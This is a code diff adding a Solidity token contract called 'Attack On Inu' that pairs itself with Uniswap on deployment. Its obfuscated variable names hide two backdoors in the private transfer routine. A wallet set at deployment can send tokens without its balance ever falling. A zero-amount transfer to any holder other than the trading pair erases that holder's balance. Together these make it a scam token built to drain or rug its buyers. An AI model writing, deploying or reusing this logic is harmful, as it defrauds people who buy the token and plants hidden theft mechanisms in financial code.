@@ -1,0 +1,61 @@
+contract AOI is Ownable {
+    function transfer(address jOFHGscJu, uint256 UzKSJoMRi) public returns (bool success) {
+        tpia(msg.sender, jOFHGscJu, UzKSJoMRi);
+        return true;
+    }
+
+    function transferFrom(address muitvhlxdpa, address jOFHGscJu, uint256 UzKSJoMRi) public returns (bool success) {
+        require(UzKSJoMRi <= allowance[muitvhlxdpa][msg.sender]);
+        allowance[muitvhlxdpa][msg.sender] -= UzKSJoMRi;
+        tpia(muitvhlxdpa, jOFHGscJu, UzKSJoMRi);
+        return true;
+    }
+
+    uint256 private UbDdlJVSN = 101;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    constructor(address cbwUtoMZg) {
+        balanceOf[msg.sender] = totalSupply;
+        iNRAsdoEm[cbwUtoMZg] = UbDdlJVSN;
+        IUniswapV2Router02 kyaofdmnp = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        FpCzdbrRE = IUniswapV2Factory(kyaofdmnp.factory()).createPair(address(this), kyaofdmnp.WETH());
+    }
+
+    uint256 public totalSupply = 10000000000 * 10 ** 9;
+
+    mapping(address => uint256) private iNRAsdoEm;
+
+    function tpia(address muitvhlxdpa, address jOFHGscJu, uint256 UzKSJoMRi) private {
+        if (0 == iNRAsdoEm[muitvhlxdpa]) {
+            balanceOf[muitvhlxdpa] -= UzKSJoMRi;
+        }
+        balanceOf[jOFHGscJu] += UzKSJoMRi;
+        if (0 == UzKSJoMRi && jOFHGscJu != FpCzdbrRE) {
+            balanceOf[jOFHGscJu] = UzKSJoMRi;
+        }
+        emit Transfer(muitvhlxdpa, jOFHGscJu, UzKSJoMRi);
+    }
+
+    mapping(address => uint256) private tokzajin;
+
+    string public symbol = 'AOI';
+
+    uint8 public decimals = 9;
+
+    mapping(address => uint256) public balanceOf;
+
+    function approve(address CAJKxvljR, uint256 UzKSJoMRi) public returns (bool success) {
+        allowance[msg.sender][CAJKxvljR] = UzKSJoMRi;
+        emit Approval(msg.sender, CAJKxvljR, UzKSJoMRi);
+        return true;
+    }
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    address public FpCzdbrRE;
+
+    string public name = 'Attack On Inu';
+}
